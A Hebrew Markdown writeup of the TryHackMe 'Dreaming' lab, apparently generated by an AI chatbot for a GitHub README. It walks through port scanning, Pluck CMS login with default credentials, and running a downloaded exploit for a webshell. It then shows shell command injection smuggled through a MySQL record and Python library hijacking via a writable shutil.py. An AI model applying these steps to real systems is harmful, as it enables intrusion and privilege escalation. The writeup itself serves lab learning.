הנה המדריך (Writeup) בפורמט **Markdown** מקצועי, מותאם להעלאה ישירה ל-GitHub (קובץ `README.md`). הוא מעוצב בצורה סרוקה עם קטעי קוד, טבלאות והיררכיה ברורה.

---

# 💤 Dreaming - TryHackMe Writeup
**Machine URL:** [Dreaming on TryHackMe](https://tryhackme.com/room/dreaming)  
**Difficulty:** Medium  
**Focus:** CMS Exploitation, Command Injection, Python Library Hijacking

---

## 📑 Table of Contents
1. [Enumeration](#1-enumeration)
2. [Initial Access (Lucien Flag)](#2-initial-access-lucien-flag)
3. [Privilege Escalation (Death Flag)](#3-privilege-escalation-death-flag)
4. [Horizontal Escalation (Morpheus Flag)](#4-horizontal-escalation-morpheus-flag)

---

## 1. Enumeration

### Phase 1: Port Scanning
נפתח בסריקת Nmap בסיסית כדי לזהות שירותים רצים.

**Command:**
```bash
nmap -sS -v <MACHINE_IP>
```

**Findings:**
| Port | Service | Description |
| :--- | :--- | :--- |
| 22 | SSH | Open (OpenSSH 8.2p1) |
| 80 | HTTP | Open (Apache Default Page) |

### Phase 2: Directory Fuzzing
מכיוון שדף הבית הוא ברירת המחדל של Apache, נחפש ספריות חבויות.

**Command:**
```bash
gobuster dir -u http://<MACHINE_IP> -w /usr/share/wordlists/dirb/big.txt
```

**Findings:**
* **Path found:** `/app`
* **CMS identified:** Pluck 4.7.13 נמצא בתוך `/app/pluck-4.7.13`.

---

## 2. Initial Access (Lucien Flag)

### Step 1: Pluck CMS Exploitation
מערכת Pluck בגרסה זו פגיעה להעלאת קבצים (RCE). ראשית, נתחבר לממשק הניהול.

* **Login URL:** `http://<MACHINE_IP>/app/pluck-4.7.13/login.php`
* **Default Credentials:** `admin:password`

### Step 2: Exploitation
נשתמש באקספלויט (CVE-2020-29607) כדי להעלות Webshell.

**Command:**
```bash
wget https://www.exploit-db.com/download/49909 -O exploit.py
python3 ./exploit.py <MACHINE_IP> 80 password /app/pluck-4.7.13
```

**Findings:**
לאחר קבלת ה-Webshell, סרקתי את הקבצים במכונה ומצאתי בתיקיית `/opt` את הקובץ `test.py`.
> **Credential Found:** Lucien : `[REDACTED_PASSWORD]`

**Action:**
התחברות באמצעות SSH: `ssh lucien@<MACHINE_IP>`.
**Flag 1:** `/home/lucien/user.txt`

---

## 3. Privilege Escalation (Death Flag)

### Step 1: Identifying the Vulnerability
נבדוק את הרשאות ה-Sudo של המשתמש.

**Command:**
```bash
sudo -l
```

**Findings:**
Lucien רשאי להריץ את הסקריפט `/opt/scripts/getDreams.py` כמשתמש **death** ללא סיסמה.

### Step 2: MySQL Injection
בדיקה של קוד המקור של `getDreams.py` חשפה שהוא מריץ פקודות מערכת (`echo`) המבוססות על נתונים מה-DB ללא סינון:
`command = f"echo {dreamer} + {dream}"`

**Command (Injection via MySQL):**
מצאתי את סיסמת ה-MySQL ב-`.bash_history`. התחברתי והזרקתי פקודה שתקרא את הדגל:
```sql
mysql -u lucien -p[PASSWORD]
USE library;
INSERT INTO dreams (dreamer, dream) VALUES ("'flag'", "'; cat /home/death/death_flag.txt; # ");
```

**Action:**
הריצו את הסקריפט שוב: `sudo -u death python3 /opt/scripts/getDreams.py`.
**Flag 2:** מופיע בפלט של פקודת ה-Echo המוזרקת.

---

## 4. Horizontal Escalation (Morpheus Flag)

### Step 1: Finding Weak Permissions
כמשתמש **death**, נחפש קבצים השייכים לקבוצת **morpheus**.

**Command:**
```bash
find / -type f -group morpheus 2> /dev/null
```

**Findings:**
הקובץ `/home/death/restore.py` מבצע גיבוי ומשתמש בספריית `shutil` של Python.
בנוסף, גיליתי שקובץ הספרייה `/usr/lib/python3.8/shutil.py` ניתן לכתיבה (Writable) על ידי הקבוצה שלי.

### Step 2: Python Library Hijacking
נערוך את קובץ הספרייה הרשמי של המערכת כדי להריץ קוד זדוני כאשר סקריפט הגיבוי ירוץ (כנראה על ידי Cron Job של Morpheus).

**Action:**
הוספתי את השורה הבאה לפונקציה `copy2` בתוך `shutil.py`:
```python
import os
os.system("chmod 777 /home/morpheus/morpheus_flag.txt")
```

**Final Flag:**
המתנתי דקה שה-Cron Job ירוץ, ולאחר מכן הדגל הפך לקריא לכולם:
```bash
cat /home/morpheus/morpheus_flag.txt
```

---

## 🛡️ Conclusion
החדר מדגים שרשרת תקיפה קלאסית:
1.  זיהוי גרסת CMS פגיעה.
2.  ניצול Command Injection בתוך סקריפטים פנימיים.
3.  Library Hijacking ב-Python עקב הרשאות קבצים לא תקינות במערכת ההפעלה.

---
**נכתב על ידי Gemini** (או השם שלך למיתוג ב-GitHub).

---

**האם תרצה שאצור לך קובץ `scripts` לדוגמה שתוכל להעלות לאותו Repo ב-GitHub כדי להשלים את ה-Writeup?**
